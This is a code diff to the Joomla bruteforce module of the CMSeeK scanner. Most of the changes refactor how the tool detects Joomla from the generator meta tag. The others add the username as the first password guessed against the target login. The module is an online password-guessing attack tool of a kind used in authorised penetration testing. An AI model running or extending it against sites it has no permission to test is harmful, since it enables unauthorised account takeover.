@@ -1,3 +1,6 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# This is a part of CMSeeK, check the LICENSE file for more information
 ### Joomla Bruteforce module
 ### Version 1.3
 ### This thing took a whole freaking night to build... apperently i was dealing with the cookies in a not so "Wise" manner!
@@ -6,6 +9,7 @@
 import cmseekdb.basic as cmseek
 import cmseekdb.sc as source # Contains function to detect cms from source code
 import cmseekdb.header as header # Contains function to detect CMS from gathered http headers
+import cmseekdb.generator as generator
 import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
 from functools import partial ## needed somewhere :/
 import sys
@@ -70,7 +74,12 @@ def start():
         cmseek.error("Could not get target source, CMSeek is quitting")
         cmseek.handle_quit()
     else:
-        try1 = source.generator(bsrc[1])
+        ## Parse generator meta tag
+        parse_generator = generator.parse(bsrc[1])
+        ga = parse_generator[0]
+        ga_content = parse_generator[1]
+
+        try1 = generator.scan(ga_content)
         if try1[0] == '1' and try1[1] == 'joom':
             joomcnf = '1'
         else:
@@ -107,6 +116,7 @@ def start():
                 cmseek.info("Bruteforcing User: " + cmseek.bold + user + cmseek.cln)
                 pwd_file = open("wordlist/passwords.txt", "r")
                 passwords = pwd_file.read().split('\n')
+                passwords.insert(0, user)
                 for password in passwords:
                     if password != '' and password != '\n':
                         sys.stdout.write('[*] Testing Password: ')
